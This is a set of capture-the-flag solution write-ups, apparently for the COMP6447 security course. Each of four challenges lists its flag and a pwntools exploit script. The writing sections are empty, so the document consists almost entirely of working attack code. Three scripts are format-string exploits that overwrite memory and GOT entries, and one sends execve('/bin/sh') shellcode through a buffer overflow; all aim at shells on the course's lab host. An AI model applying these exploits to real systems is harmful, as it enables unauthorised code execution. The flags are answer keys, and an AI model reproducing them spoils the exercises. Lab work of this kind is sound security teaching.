door
===========================

Flag: │COMP6447{knock_knock..._who's_there??}

General overview of problems faced
-------------------------------------


Script/Command used
------------------
```
ffrom pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# p = process("./door")
p = remote("plzpwn.me","4000")
p.recvuntil("at ")
ad = int(p.recv(10), 16)
log.info(hex(ad))

form = (".%s%s%s%s."
        "%%1$046x."
        "%%2$hhn."
        "%%1$269x."
        "%%3$hhn."
        "%%1$243x."
        "%%4$hhn."
        "%%1$012x."
        "%%5$hhn." %
        (p32(ad), p32(ad+1), p32(ad+2), p32(ad+3)))
log.info(form)
p.recv()
p.sendline(form)
p.recv()
p.interactive()
```

snake
=============

Flag: COMP6447{im_running_out_of_memes}


General overview of problems faced
-------------------------------------


Script/Command used
------------------
```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']


execve = """
    mov eax, 0xb;
    push 6845231;
    push 1852400175;
    mov ebx, esp;
    mov ecx, 0;
    mov edx, 0;
    int 0x80;
"""


p = remote("plzpwn.me","4001")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("A"*0x50)
print p.recvuntil("offset ")
address = p.recv(10)
vul = int(address, 16) - 158
print(address)
log.info("start of buffer: " + hex(vul))

p.sendline("1")
payload = asm(execve)
fill = 54 - len(payload)
p.sendline(payload + '\0'*fill + p32(vul))
print p.recv()
p.interactive()
```

formatrix
=============

Flag: COMP6447{i_r8_th15_m0vie_4/12}

General overview of problems faced
-------------------------------------


Script/Command used
------------------
```
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# p = process("./formatrix")
p = remote("plzpwn.me", "4002")
print p.recv()

#0x08048536
got = 0x8049c18
formatStr = (p32(got+3)+
        "%s"
        "%s"
        "%s"
        "%%1$247x."
        "%%3$hhn."
        "%%1$250x."
        "%%4$hhn."
        "%%1$127x."
        "%%5$hhn."
        "%%1$175x."
        "%%6$hhn." %
        (p32(got+2), p32(got+1), p32(got)))
log.info(p32(got))
log.info(formatStr)
p.sendline(formatStr)
print(p.recv())
p.interactive()
```

sploitwarz
=============

Flag:  COMP6447{almost_as_hard_as_installing_gentoo}

General overview of problems faced
-------------------------------------


Script/Command used
------------------
```
from pwn import *
import sys

fib = [0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765]
context.terminal = ['tmux', 'splitw', '-h']

p = process('./sploitwarz')
# p = remote("plzpwn.me", "4003")
pause()
p.recv()
p.sendline('%147$#x')
p.recv()
p.sendline('g')
p.recv()
p.sendline('0.0001')
p.recvuntil(":\n")
nonfib = 0
for i in range(5):
    p.recvuntil(" ")
    x = int(p.recvline())
    if ( x not in fib):
        nonfib = i+1
p.recv()
p.sendline(str(nonfib))
p.recvuntil("done, ")
leak = int(p.recv(10), 16)
win = leak - 3135
gotcha = win + 10888
print(hex(win))
win32 = p32(win)
def pad(d):
    s ='0'*3
    s += str(d)
    return s[-3:]


start = 16 + 1
print(hex(ord(win32[3])))
print(hex(ord(win32[2])))
print(hex(ord(win32[1])))
print(hex(ord(win32[0])))
off1 = ord(win32[3])*256 + ord(win32[2]) - start
off2 = ord(win32[1])*256 + ord(win32[0]) - off1 - 19



formatStr = ("%s%s%s%s"
        "%%8$n"
        "%%1$%sx."
        "%%6$hn."
        "%%1$%sx."
        "%%8$hn." %
        (p32(gotcha+3), p32(gotcha+2), p32(gotcha+1), p32(gotcha+0),
        off1, off2))

print("exit is at " + hex(gotcha))
print("win is at " + hex(win))

p.recv()
p.sendline("\nc")
p.recv()
p.sendline(formatStr)
p.sendline("\n")
p.recv()
p.sendline("g")
p.recv()
p.sendline('0.0001')
p.recvuntil(":\n")
nonfib = 0
for i in range(5):
    p.recvuntil(" ")
    x = int(p.recvline())
    if ( x not in fib):
        nonfib = i+1
p.recv()
p.sendline(str(nonfib))
p.recvuntil("done, ")
p.recv()
p.interactive()
```